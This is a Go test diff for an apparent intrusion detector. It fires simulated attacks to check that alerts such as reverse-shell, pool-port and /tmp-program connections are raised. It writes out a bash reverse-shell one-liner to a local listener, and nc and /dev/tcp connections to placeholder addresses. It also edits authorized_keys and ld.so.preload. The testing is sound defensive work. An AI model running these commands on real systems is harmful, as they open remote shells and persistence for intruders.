@@ -4,6 +4,8 @@ package live
 
 import (
 	"context"
+	"fmt"
+	"net"
 	"os"
 	"os/exec"
 	"strings"
@@ -64,24 +66,75 @@ func TestKernel(t *testing.T) {
 	run("cd /etc && touch ld.so.preload && rm -f ld.so.preload")
 	run("mkdir -p /root/.ssh && echo key >> /root/.ssh/authorized_keys")
 	run("echo hello > /etc/hostname.dgtest; rm -f /etc/hostname.dgtest")
-	time.Sleep(time.Second)
+
+	// Connections: a program from /tmp, and a process it starts after
+	// forking; a shell to a pool's port (unroutable, so it times out).
+	_, noBash := exec.LookPath("bash")
+	if noBash == nil {
+		run("cp /bin/bash /tmp/dgnet && timeout 1 /tmp/dgnet -c 'exec 3<>/dev/tcp/203.0.113.9/443'; rm -f /tmp/dgnet")
+		run("cp /bin/bash /tmp/dgfork && timeout 1 /tmp/dgfork -c '(cat < /dev/tcp/203.0.113.10/8443)'; rm -f /tmp/dgfork")
+		run("timeout 1 bash -c 'exec 3<>/dev/tcp/203.0.113.9/3333'")
+	} else {
+		// BusyBox only, as in a minimal VM: its nc, copied to /tmp under
+		// its own name, and started by a shell copied there.
+		run("cp /bin/busybox /tmp/nc && timeout 2 /tmp/nc -w 1 203.0.113.9 443; rm -f /tmp/nc")
+		run("cp /bin/busybox /tmp/sh && timeout 2 /tmp/sh -c 'nc -w 1 203.0.113.10 8443; true'; rm -f /tmp/sh")
+		run("timeout 2 nc -w 1 203.0.113.9 3333")
+	}
+	// Reverse shells to a listener here: a shell that connects and takes
+	// the connection as its input and output, and one started with it.
+	listener, err := net.Listen("tcp", "127.0.0.1:0")
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer listener.Close()
+	go func() {
+		for {
+			conn, err := listener.Accept()
+			if err != nil {
+				return
+			}
+			defer conn.Close()
+		}
+	}()
+	port := listener.Addr().(*net.TCPAddr).Port
+	if noBash == nil {
+		run(fmt.Sprintf("setsid bash -c 'timeout 3 bash -i >& /dev/tcp/127.0.0.1/%d 0>&1' </dev/null >/dev/null 2>&1 &", port))
+	}
+	if conn, err := net.Dial("tcp", listener.Addr().String()); err == nil {
+		file, _ := conn.(*net.TCPConn).File()
+		shell := exec.Command("sh", "-c", "sleep 2")
+		shell.Stdin, shell.Stdout = file, file
+		shell.Start()
+		defer shell.Wait()
+		conn.Close()
+		defer file.Close()
+	}
+	time.Sleep(3 * time.Second)
 	agentName = agent
 	detector.AskTest()
 	time.Sleep(3 * time.Second)
 	status, alerts := detector.Take()
 	found := map[string]Alert{}
 	for _, alert := range alerts {
-		t.Logf("%s %s %s | %s | %s", alert.Rule, alert.Severity, alert.Title, alert.Program, alert.Command)
+		t.Logf("%s %s %s | %s | %s | %s", alert.Rule, alert.Severity, alert.Title, alert.Program, alert.Parent, alert.Command)
 		key := alert.Rule
 		if alert.Test {
 			key = "test"
 		}
 		found[key] = alert
 	}
-	for _, rule := range []string{RuleTempProgram, RuleServiceShell, RuleMiner, RuleDownloadRun, RulePersistence, RuleSSHLogins, "test"} {
+	for _, rule := range []string{RuleTempProgram, RuleServiceShell, RuleMiner, RuleDownloadRun, RulePersistence, RuleSSHLogins, RuleReverseShell, RuleMarkedOut, RulePoolPort, "test"} {
 		if _, ok := found[rule]; !ok {
 			t.Errorf("no %s alert", rule)
 		}
+	}
+	forked := false
+	for _, alert := range alerts {
+		forked = forked || alert.Rule == RuleMarkedOut && strings.Contains(alert.Remote, "203.0.113.10")
+	}
+	if !forked {
+		t.Error("no alert for the connection of a process a /tmp program started")
 	}
 	for _, alert := range alerts {
 		if strings.Contains(alert.Path, "hostname") {
